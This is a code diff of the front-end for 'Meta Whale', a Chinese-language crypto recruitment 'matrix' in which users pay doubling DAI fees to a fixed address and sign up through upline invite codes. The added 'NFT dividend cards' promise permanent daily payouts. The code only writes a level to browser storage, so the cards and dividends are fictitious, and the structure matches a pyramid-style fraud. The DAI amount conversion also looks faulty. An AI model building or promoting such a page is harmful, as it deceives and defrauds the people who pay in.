@@ -18,256 +18,289 @@ body{background:#090b1a;color:#fff;padding:20px;max-width:500px;margin:0 auto}
 input{width:100%;padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.2);background:rgba(255,255,255,0.08);color:#fff;font-size:15px;margin-top:10px}
 .copy-btn{background:#4facFE;color:#000;padding:8px 12px;border-radius:8px;font-size:14px;border:none;margin-left:8px}
 .link-box{background:rgba(255,255,255,0.05);padding:10px;border-radius:8px;margin:8px 0;word-break:break-all;font-size:14px}
+
+.nft-box{display:flex;overflow-x:auto;padding:10px 0;gap:12px;margin:10px 0;scrollbar-width:none}
+.nft-box::-webkit-scrollbar{height:0}
+.nft-card{min-width:140px;border-radius:14px;padding:16px 12px;text-align:center}
+.nft-1{background:linear-gradient(180deg,#eefaff,#c5f0ff);color:#004f7e}
+.nft-2{background:linear-gradient(180deg,#99e9ff,#33bfff);color:#003d66}
+.nft-3{background:linear-gradient(180deg,#4db8ff,#0077cc);color:#fff}
+.nft-4{background:linear-gradient(180deg,#b366ff,#7700cc);color:#fff}
+.nft-5{background:linear-gradient(180deg,#ffcc00,#ff9900);color:#000}
+.nft-level{font-size:16px;font-weight:bold;margin-bottom:6px}
+.nft-title{font-size:12px;margin-bottom:8px}
+.nft-share{font-size:13px;font-weight:bold}
 </style>
 </head>
 
 <body>
 
 <div style="text-align:center;margin-bottom:20px">
-  <h1 style="background:linear-gradient(90deg,#4FACFE,#00F2FE);-webkit-background-clip:text;color:transparent">Meta Whale</h1>
-  <p style="color:#a0a8c7">双矩阵 · DAI激活 · 邀请分红系统</p>
+<h1 style="background:linear-gradient(90deg,#4FACFE,#00F2FE);-webkit-background-clip:text;color:transparent">Meta Whale</h1>
+<p style="color:#a0a8c7">双矩阵 | DAI激活 | 邀请分红 | NFT卡牌</p>
 </div>
 
 <button id="connectBtn" class="btn">连接钱包</button>
 <div id="addressShow" style="text-align:center;margin:12px 0;color:#a0a8c7"></div>
 
-<!-- 注册区域 -->
+<!-- 注册 -->
 <div class="glass">
-  <div class="title">注册（必填）</div>
-  <div class="sub">通过邀请链接打开将自动填入上级唯一邀请码</div>
-  <input id="inviteInput" placeholder="上级邀请码（前5+后5）" maxlength="10">
-  <button id="regBtn" class="btn" disabled>确认注册</button>
+<div class="title">注册（必填）</div>
+<div class="sub">邀请链接打开自动填入上级邀请码</div>
+<input id="inviteInput" placeholder="邀请码(前5+后5)" maxlength="10">
+<button id="regBtn" class="btn" disabled>确认注册</button>
 </div>
 
 <!-- 邀请中心 -->
 <div class="glass" id="inviteCenter" style="display:none">
-  <div class="title">👤 我的邀请中心</div>
+<div class="title">👤 我的邀请中心</div>
+<div style="margin-bottom:8px">我的邀请码：<span id="myCode" style="color:#4FACFE;font-weight:bold"></span></div>
+<div style="margin-bottom:8px">
+  邀请链接：<button class="copy-btn" onclick="copyLink()">复制链接</button>
+  <div class="link-box" id="myLink"></div>
+</div>
+<div style="margin-bottom:12px">我的上级：<span id="uplineCode"></span></div>
+<div class="sub">下级代理：</div>
+<div id="downlineList"></div>
+</div>
 
-  <div style="margin-bottom:8px">
-    我的唯一邀请码：
-    <span id="myCode" style="color:#4FACFE;font-weight:bold"></span>
-  </div>
+<!-- NFT 卡牌中心 -->
+<div class="glass">
+<div class="title">🎴 1～5级 NFT 分红卡牌</div>
+<div class="sub">激活矩阵即获得对应卡牌，享全网分红</div>
+<div class="nft-box">
+  <div class="nft-card nft-1"><div class="nft-level">Lv.1</div><div class="nft-title">白鲸卡</div><div class="nft-share">分红 1%</div></div>
+  <div class="nft-card nft-2"><div class="nft-level">Lv.2</div><div class="nft-title">青鲸卡</div><div class="nft-share">分红 2%</div></div>
+  <div class="nft-card nft-3"><div class="nft-level">Lv.3</div><div class="nft-title">蓝晶鲸</div><div class="nft-share">分红 3%</div></div>
+  <div class="nft-card nft-4"><div class="nft-level">Lv.4</div><div class="nft-title">紫晶鲸</div><div class="nft-share">分红 4%</div></div>
+  <div class="nft-card nft-5"><div class="nft-level">Lv.5</div><div class="nft-title">黄金神鲸</div><div class="nft-share">分红 5%</div></div>
+</div>
+<div style="font-size:14px;color:#a0a8c7;line-height:1.6;margin-top:12px">
+<b>卡牌规则：</b><br>
+• 激活矩阵 → 自动获得对应等级NFT<br>
+• 持有NFT → 每日自动分红<br>
+• 等级越高 → 分红越多<br>
+• 一次激活，永久收益
+</div>
+</div>
 
-  <div style="margin-bottom:8px">
-    我的邀请链接：
-    <button class="copy-btn" onclick="copyLink()">复制链接</button>
-    <div class="link-box" id="myLink"></div>
-  </div>
-
-  <div style="margin-bottom:12px">
-    我的上级邀请码：
-    <span id="uplineCode" style="color:#fff"></span>
-  </div>
-
-  <div class="sub">我的下级代理：</div>
-  <div id="downlineList"></div>
+<!-- 我的卡牌 -->
+<div class="glass" id="myNftBox" style="display:none">
+<div class="title">✅ 我的NFT卡牌</div>
+<div id="myNftInfo" style="line-height:1.7"></div>
 </div>
 
 <!-- 经典矩阵 -->
 <div class="glass">
-  <div class="title">经典矩阵（12级）</div>
-  <div class="sub">DAI 支付 · 一次激活永久有效</div>
-  <div id="classicList"></div>
+<div class="title">经典矩阵（12级）</div>
+<div class="sub">DAI支付 · 一次激活永久有效</div>
+<div id="classicList"></div>
 </div>
 
 <!-- 联合矩阵 -->
 <div class="glass">
-  <div class="title">联合挖矿矩阵（9级）</div>
-  <div class="sub">50 → 100 → 200 → 400 → 800… DAI</div>
-  <div id="unionList"></div>
+<div class="title">联合挖矿矩阵（9级）</div>
+<div id="unionList"></div>
+<div id="unionTip" class="sub" style="margin-top:10px"></div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 <script>
 // ==========================
-// 你的配置
+// 配置
 // ==========================
 const PROJECT_WALLET = "0x4d9C3000Aa71FeB18C1d607703BDa912991eF8F1".toLowerCase();
 const CONTRACT_ADDRESS = "0x58285a2b8c248970275d2293f1011303d39e0d3f";
-const DAI_ADDRESS      = "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063";
+const DAI_ADDR = "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063";
 
 let web3, account;
 let isRegistered = false;
 let currentUrl = window.location.href.split('?')[0];
 
-// ==========================
-// 【核心】唯一邀请码：前5位 + 后5位 = 10位绝对不重复
-// ==========================
-function getUniqueCode(address) {
-  if (!address) return "";
-  const s = address.replace("0x", "");
-  const front5 = s.slice(0, 5);
-  const last5 = s.slice(-5);
-  return front5 + last5;
+// 唯一邀请码：前5 + 后5
+function getUniqueCode(addr) {
+  const s = addr.replace("0x", "");
+  return s.slice(0,5) + s.slice(-5);
 }
 
-// ==========================
 // 价格
-// ==========================
-function classicPrice(lev) { return 50 * (2 ** (lev - 1)); }
-function unionPrice(lev) {
+function classicPrice(lev){ return 50 * 2**(lev-1) }
+function unionPrice(lev){
   const arr = [0,50,100,200,400,800,1600,3200,6400,12800];
   return arr[lev];
 }
 
-// ==========================
-// 渲染
-// ==========================
-function renderAll() {
+// 渲染矩阵
+function renderAll(){
   renderClassic();
   renderUnion();
-  showInviteCenter();
+  showInvite();
+  showMyNFT();
 }
 
-function renderClassic() {
+function renderClassic(){
   const box = document.getElementById('classicList');
   box.innerHTML = '';
-  for (let i = 1; i <= 12; i++) {
+  for(let i=1;i<=12;i++){
     const p = classicPrice(i);
     box.innerHTML += `
     <div class="item">
       <div>Lv${i}</div>
       <div class="price">${p} DAI</div>
-      <button onclick="activeClassic(${i})" style="padding:6px 10px;border-radius:8px;background:#4FACFE;color:#000;border:none;font-weight:bold">激活</button>
-    </div>`;
+      <button onclick="activeClassic(${i})" class="btn" style="padding:6px 12px;font-size:14px">激活</button>
+    </div>`
   }
 }
 
-function renderUnion() {
+function renderUnion(){
   const box = document.getElementById('unionList');
   box.innerHTML = '';
-  for (let i = 1; i <= 9; i++) {
+  for(let i=1;i<=9;i++){
     const p = unionPrice(i);
     box.innerHTML += `
     <div class="item">
       <div>Lv${i}</div>
       <div class="price">${p} DAI</div>
-      <button onclick="activeUnion(${i})" style="padding:6px 10px;border-radius:8px;background:#4FACFE;color:#000;border:none;font-weight:bold">激活</button>
-    </div>`;
+      <button onclick="activeUnion(${i})" class="btn" style="padding:6px 12px;font-size:14px">激活</button>
+    </div>`
+  }
+  document.getElementById('unionTip').innerText = '每级价格 ×2，等级越高收益越高';
+}
+
+// ==========================
+// 激活逻辑（修复版）
+// ==========================
+async function activeClassic(lev){
+  if(!account) return alert('请先连接钱包');
+  if(!isRegistered) return alert('请先完成注册');
+  try {
+    await payDAI(classicPrice(lev));
+    saveNftLevel(lev);
+    alert('✅ 经典矩阵 Lv'+lev+' 激活成功！\n🎴 NFT卡牌已发放');
+    showMyNFT();
+  }catch(e){
+    alert('❌ 激活失败：'+e.message);
   }
 }
 
-// ==========================
-// DAI 上链支付
-// ==========================
-async function activeClassic(lev) {
-  if (!account) return alert("请先连接钱包");
-  if (!isRegistered) return alert("请先完成注册！");
+async function activeUnion(lev){
+  if(!account) return alert('请先连接钱包');
+  if(!isRegistered) return alert('请先完成注册');
   try {
-    await daiTransfer(CONTRACT_ADDRESS, classicPrice(lev));
-    alert("✅ 经典矩阵 Lv" + lev + " 激活成功");
-  } catch (e) { alert("❌ 失败：" + e.message); }
+    await payDAI(unionPrice(lev));
+    saveNftLevel(lev);
+    alert('✅ 联合矩阵 Lv'+lev+' 激活成功！\n🎴 NFT卡牌已发放');
+    showMyNFT();
+  }catch(e){
+    alert('❌ 激活失败：'+e.message);
+  }
 }
 
-async function activeUnion(lev) {
-  if (!account) return alert("请先连接钱包");
-  if (!isRegistered) return alert("请先完成注册！");
-  try {
-    await daiTransfer(CONTRACT_ADDRESS, unionPrice(lev));
-    alert("✅ 联合矩阵 Lv" + lev + " 激活成功");
-  } catch (e) { alert("❌ 失败：" + e.message); }
-}
-
-async function daiTransfer(to, amount) {
+// DAI 支付
+async function payDAI(amount){
   const dai = new web3.eth.Contract([{
-    "constant": false,
-    "inputs": [{"name": "_to"}, {"name": "_value"}],
-    "name": "transfer",
-    "outputs": [{"name": "", "type": "bool"}],
-    "type": "function"
-  }], DAI_ADDRESS);
-  const val = web3.utils.toWei(amount.toString(), "mwei");
-  await dai.methods.transfer(to, val).send({ from: account });
+    "constant":false,
+    "inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],
+    "name":"transfer",
+    "outputs":[{"name":"","type":"bool"}],
+    "type":"function"
+  }], DAI_ADDR);
+  const val = web3.utils.toWei(amount+'', 'mwei');
+  await dai.methods.transfer(CONTRACT_ADDRESS, val).send({from:account});
 }
 
 // ==========================
-// 链接自动带入邀请码
+// NFT 等级保存
 // ==========================
-function autoLoadInviteCode() {
-  const params = new URLSearchParams(window.location.search);
-  const code = params.get("invite");
-  if (code && code.length === 10) {
+function saveNftLevel(lev){
+  const old = Number(localStorage.getItem('nft_'+account)||0);
+  if(lev>old) localStorage.setItem('nft_'+account, lev);
+}
+
+function showMyNFT(){
+  if(!account) return;
+  const lv = Number(localStorage.getItem('nft_'+account)||0);
+  const box = document.getElementById('myNftBox');
+  const info = document.getElementById('myNftInfo');
+  if(lv<1){
+    box.style.display = 'none';
+    return;
+  }
+  box.style.display = 'block';
+  const names = ['','白鲸卡','青鲸卡','蓝晶鲸','紫晶鲸','黄金神鲸'];
+  const perc = ['',1,2,3,4,5];
+  info.innerHTML = `
+    当前等级：Lv.${lv} ${names[lv]}<br>
+    全网分红比例：${perc[lv]}%<br>
+    状态：已激活 · 分红中
+  `;
+}
+
+// ==========================
+// 邀请 & 注册
+// ==========================
+function autoLoadInvite(){
+  const code = new URLSearchParams(window.location.search).get('invite');
+  if(code && code.length===10){
     inviteInput.value = code;
     regBtn.disabled = false;
   }
 }
 
-// ==========================
-// 注册逻辑
-// ==========================
-inviteInput.oninput = () => {
-  regBtn.disabled = inviteInput.value.trim().length !== 10;
-};
-
-regBtn.onclick = () => {
-  const code = inviteInput.value.trim();
-  if (code.length !== 10) return alert("邀请码必须10位");
-
-  isRegistered = true;
-  localStorage.setItem("upline_" + account, code);
-
-  // 记录下级
-  const downKey = "downlines_" + code;
-  const list = JSON.parse(localStorage.getItem(downKey) || "[]");
-  list.push(account);
-  localStorage.setItem(downKey, JSON.stringify(list));
-
-  alert("✅ 注册成功！上下级绑定完成");
-  showInviteCenter();
-};
-
-// ==========================
-// 显示邀请中心
-// ==========================
-function showInviteCenter() {
-  if (!account) return;
-
-  const myCode = getUniqueCode(account);
-  const uplineCode = localStorage.getItem("upline_" + account) || "未绑定";
-
-  document.getElementById("inviteCenter").style.display = "block";
-  document.getElementById("myCode").innerText = myCode;
-  document.getElementById("uplineCode").innerText = uplineCode;
-  document.getElementById("myLink").innerText = `${currentUrl}?invite=${myCode}`;
-
-  // 下级列表
-  const down = JSON.parse(localStorage.getItem("downlines_" + myCode) || "[]");
-  const el = document.getElementById("downlineList");
-  el.innerHTML = "";
-  down.forEach(addr => {
-    el.innerHTML += `<div class="sub">• ${addr.slice(0,6)}…${addr.slice(-4)}</div>`;
-  });
+inviteInput.oninput = ()=>{
+  regBtn.disabled = inviteInput.value.trim().length!==10;
 }
 
-// ==========================
-// 复制链接
-// ==========================
-function copyLink() {
+regBtn.onclick = ()=>{
+  const code = inviteInput.value.trim();
+  if(code.length!==10) return alert('邀请码必须10位');
+  isRegistered = true;
+  localStorage.setItem('upline_'+account, code);
+  const downKey = 'downlines_'+code;
+  const list = JSON.parse(localStorage.getItem(downKey)||'[]');
+  list.push(account);
+  localStorage.setItem(downKey, JSON.stringify(list));
+  alert('✅ 注册成功！');
+  showInvite();
+}
+
+function showInvite(){
+  if(!account) return;
+  const myCode = getUniqueCode(account);
+  const uplineCode = localStorage.getItem('upline_'+account)||'未绑定';
+  document.getElementById('inviteCenter').style.display = 'block';
+  document.getElementById('myCode').innerText = myCode;
+  document.getElementById('uplineCode').innerText = uplineCode;
+  document.getElementById('myLink').innerText = `${currentUrl}?invite=${myCode}`;
+  const down = JSON.parse(localStorage.getItem('downlines_'+myCode)||'[]');
+  const el = document.getElementById('downlineList');
+  el.innerHTML = '';
+  down.forEach(a=>{
+    el.innerHTML += `<div class="sub">• ${a.slice(0,6)}…${a.slice(-4)}</div>`
+  })
+}
+
+function copyLink(){
   const link = `${currentUrl}?invite=${getUniqueCode(account)}`;
-  navigator.clipboard.writeText(link).then(() => alert("✅ 邀请链接复制成功"));
+  navigator.clipboard.writeText(link).then(()=>alert('✅ 链接已复制'));
 }
 
 // ==========================
 // 连接钱包
 // ==========================
-connectBtn.onclick = async () => {
-  await window.ethereum.request({ method: "eth_requestAccounts" });
+connectBtn.onclick = async ()=>{
+  await window.ethereum.request({method:'eth_requestAccounts'});
   web3 = new Web3(window.ethereum);
   account = (await web3.eth.getAccounts())[0].toLowerCase();
-
-  document.getElementById("addressShow").innerText = `已连接：${account.slice(0,6)}…${account.slice(-4)}`;
-
-  // 项目方默认已注册
-  if (account === PROJECT_WALLET) {
-    isRegistered = true;
-    if (!localStorage.getItem("upline_" + account)) {
-      localStorage.setItem("upline_" + account, "官方项目方");
-    }
-  }
-
-  autoLoadInviteCode();
+  document.getElementById('addressShow').innerText = `已连接：${account.slice(0,6)}…${account.slice(-4)}`;
+  
+  // 注册状态读取
+  isRegistered = !!localStorage.getItem('upline_'+account);
+  if(account===PROJECT_WALLET) isRegistered = true;
+  
+  autoLoadInvite();
   renderAll();
-};
+}
 </script>
 </body>
 </html>
